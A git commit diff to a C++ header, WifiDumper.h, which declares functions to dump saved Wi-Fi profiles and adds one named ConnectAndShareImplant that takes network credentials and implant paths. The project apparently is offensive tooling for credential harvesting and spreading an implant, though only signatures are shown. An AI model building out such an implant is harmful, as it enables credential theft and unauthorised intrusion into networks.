7e4f9069cb16c07eedab45cf5e4c872479f8de0c
mic-cyberkid <93459729+mic-cyberkid@users.noreply.github.com>
2026-01-26 18:20:05 -0800

    Update WifiDumper.h

--- src/wifi/WifiDumper.h
+++ src/wifi/WifiDumper.h
@@ -4,4 +4,11 @@
 namespace wifi {
     std::string dumpWifiProfiles();
     std::string scanAvailableWifi();
+
+    bool ConnectAndShareImplant(
+        const std::string& ssid,
+        const std::string& password,
+        const std::string& implantPath,
+        const std::string& remotePath
+    );
 }
